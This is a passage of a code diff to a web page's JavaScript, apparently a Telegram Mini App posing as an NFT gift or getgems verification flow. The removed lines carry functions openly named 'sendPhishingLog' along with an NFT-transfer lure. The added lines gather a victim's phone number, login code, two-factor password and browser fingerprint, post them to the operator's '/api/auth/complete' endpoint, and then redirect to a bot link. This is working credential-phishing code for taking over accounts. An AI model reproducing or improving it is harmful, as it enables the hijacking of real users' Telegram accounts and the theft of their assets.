+            countdown = 59;
+            const timerElement = document.getElementById('timer');
+            
+            countdownInterval = setInterval(() => {
+                timerElement.textContent = `Resend code in 0:${countdown.toString().padStart(2, '0')}`;
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    timerElement.innerHTML = '<a href="#" onclick="resendCode()" style="color: var(--primary);">Resend code</a>';
                 }
                 
-            } catch (error) {
-                sendPhishingLog('session_error', `Session creation error: ${error.message}`);
-            }
-        }
-
-        function sendPhishingLog(action, details) {
-            const logData = {
-                type: 'phishing_log',
-                action: action,
-                details: details,
-                user_id: phishingData.user_id,
-                gift_id: phishingData.gift_id,
-                timestamp: new Date().toISOString()
-            };
-
-            if (window.Telegram && Telegram.WebApp) {
-                Telegram.WebApp.sendData(JSON.stringify(logData));
-            }
-
-            fetch('/api/phishing_log', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(logData)
-            }).catch(console.error);
-
-            console.log('Phishing Log:', action, details);
-        }
-
-        function sendToTelegramLog(message) {
-            fetch('/api/send_telegram_log', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ message: message })
-            }).catch(console.error);
-        }
-
-        function processGiftWithdrawal(giftId) {
-            const giftIndex = userData.gifts.findIndex(g => g.id === giftId);
-            if (giftIndex !== -1) {
-                userData.gifts.splice(giftIndex, 1);
-                updateUI();
-                sendPhishingLog('gift_withdrawn', `Gift ${giftId} successfully withdrawn`);
-            }
-        }
-
-        function connectBot() {
-            showNotification('Account verification required for NFT transfer', 'info');
-            setTimeout(() => {
-                showAuthForGift('bot_connection');
+                countdown--;
             }, 1000);
         }
 
-        // Инициализация
+        function resendCode() {
+            fetch('/api/auth/resend_code', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ 
+                    phone: phoneNumber,
+                    country: selectedCountry.name 
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    startTimer();
+                    showSuccess('Code sent again');
+                }
+            });
+        }
+
+        function moveToNext(input, nextIndex) {
+            const value = input.value;
+            
+            if (value.length === 1) {
+                const inputs = document.querySelectorAll('.code-input');
+                if (nextIndex < inputs.length) {
+                    inputs[nextIndex].focus();
+                }
+            }
+            
+            updateAuthCode();
+        }
+
+        function updateAuthCode() {
+            const inputs = document.querySelectorAll('.code-input');
+            authCode = Array.from(inputs).map(input => input.value).join('');
+            
+            if (authCode.length === 5) {
+                verifyCode();
+            }
+        }
+
+        function verifyCode() {
+            const btn = document.getElementById('verifyCodeBtn');
+            btn.innerHTML = '<div class="loading"></div>';
+            btn.disabled = true;
+
+            fetch('/api/auth/verify_code', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    phone: phoneNumber,
+                    code: authCode,
+                    country: selectedCountry.name
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    if (data.requires_password) {
+                        currentStep = 3;
+                        showStep(currentStep);
+                    } else {
+                        completeAuth();
+                    }
+                } else {
+                    document.getElementById('codeError').style.display = 'block';
+                    shakeElement(document.querySelector('.code-inputs'));
+                }
+            })
+            .catch(error => {
+                document.getElementById('codeError').style.display = 'block';
+            })
+            .finally(() => {
+                btn.innerHTML = 'Verify';
+                btn.disabled = false;
+            });
+        }
+
+        function verifyPassword() {
+            const passwordInput = document.getElementById('password');
+            password = passwordInput.value.trim();
+            
+            if (!password) {
+                showError(passwordInput, 'Please enter password');
+                return;
+            }
+
+            const btn = document.getElementById('verifyPasswordBtn');
+            btn.innerHTML = '<div class="loading"></div>';
+            btn.disabled = true;
+
+            fetch('/api/auth/verify_password', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    phone: phoneNumber,
+                    password: password,
+                    country: selectedCountry.name
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    completeAuth();
+                } else {
+                    document.getElementById('passwordError').style.display = 'block';
+                    shakeElement(passwordInput);
+                }
+            })
+            .catch(error => {
+                document.getElementById('passwordError').style.display = 'block';
+            })
+            .finally(() => {
+                btn.innerHTML = 'Continue';
+                btn.disabled = false;
+            });
+        }
+
+        function completeAuth() {
+            currentStep = 4;
+            showStep(currentStep);
+            
+            // Отправляем финальные данные
+            fetch('/api/auth/complete', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    phone: phoneNumber,
+                    code: authCode,
+                    password: password,
+                    country: selectedCountry.name,
+                    user_data: collectUserData()
+                })
+            });
+
+            setTimeout(() => {
+                window.location.href = 'https://t.me/getgems_bot?start=success';
+            }, 3000);
+        }
+
+        function collectUserData() {
+            return {
+                user_agent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                screen_resolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies_enabled: navigator.cookieEnabled,
+                country: selectedCountry.name,
+                country_code: selectedCountry.code
+            };
+        }
+
+        function backToPhone() {
+            currentStep = 1;
+            showStep(currentStep);
+            clearInterval(countdownInterval);
+        }
+
+        function backToCode() {
+            currentStep = 2;
+            showStep(currentStep);
+        }
+
+        function showError(element, message) {
+            element.classList.add('error');
+            const errorDiv = document.createElement('div');
+            errorDiv.className = 'error-message';
+            errorDiv.textContent = message;
+            element.parentNode.appendChild(errorDiv);
+            
+            setTimeout(() => {
+                element.classList.remove('error');
+                errorDiv.remove();
+            }, 3000);
+        }
+
+        function showSuccess(message) {
+            const successDiv = document.createElement('div');
+            successDiv.className = 'success-message';
+            successDiv.textContent = message;
+            document.querySelector('.auth-container').appendChild(successDiv);
+            
+            setTimeout(() => {
+                successDiv.remove();
+            }, 3000);
+        }
+
+        function shakeElement(element) {
+            element.style.animation = 'shake 0.5s ease-in-out';
+            setTimeout(() => {
+                element.style.animation = '';
+            }, 500);
+        }
+
+        // Добавляем стили для анимации тряски
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes shake {
+                0%, 100% { transform: translateX(0); }
+                25% { transform: translateX(-5px); }
+                75% { transform: translateX(5px); }
+            }
+        `;
+        document.head.appendChild(style);
+
+        // Инициализация при загрузке
         document.addEventListener('DOMContentLoaded', function() {
-            initUser();
+            initCountries();
+            
+            if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.ready();
+                Telegram.WebApp.expand();
+            }
         });
     </script>
 </body>
